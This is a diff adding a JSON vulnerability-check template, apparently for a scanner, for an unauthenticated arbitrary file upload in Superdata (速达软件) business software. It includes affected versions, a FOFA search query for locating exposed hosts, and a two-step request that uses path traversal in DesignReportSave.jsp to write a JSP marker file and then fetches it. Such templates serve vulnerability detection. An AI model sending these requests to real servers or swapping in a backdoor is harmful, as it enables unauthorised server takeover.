@@ -1,0 +1,54 @@
+{
+  "product": "速达软件 Superdata",
+  "vul_name": "速达软件 全系产品存在任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "速达软件专注中小企业管理软件,产品涵盖进销存软件,财务软件,ERP软件,CRM系统,项目管理软件,OA系统,仓库管理软件等,是中小企业管理市场的佼佼者,提供产品、技术、服务等信息,百万企业共同选择。速达软件全系产品存在任意文件上传漏洞，未经身份认证得攻击者可以通过此漏洞上传恶意后门文件，执行任意指令，造成服务器失陷.",
+  "version": "速达A3.cloudBAS、速达A3.cloudSTD、速达A30.cloudPRO、速达3000.onlinePRO、速达A4.cloudBAS、速达A4.cloudSTD、速达A40.cloudPRO、速达4000.onlinePRO、速达A5.cloudSTD、速达A50.cloudPRO、速达A70.cloudPRO、速达5000.onlinePRO、速达7000.onlinePRO",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"速达软件-公司产品\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484716&idx=1&sn=02bb2af71eb4c568c39969ed7bf54ad8&chksm=974b882ba03c013d520617f8c0ee29e7b5c89ee6a7f8f7025728fbe1905bff37588d85082e19&scene=178&cur_album_id=2873032428486115330#rd",
+  "fix": [],
+  "exploit": [
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/report/DesignReportSave.jsp?report=../52e039302a62d077.jsp",
+        "header": {
+          "Content-Type": "application/octet-stream"
+        },
+        "data": "95cc64dd2825f9df13ec4ad683ecf339"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/52e039302a62d077.jsp"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "body": "95cc64dd2825f9df13ec4ad683ecf339"
+          }
+        ]
+      }
+    }
+  ]
+}
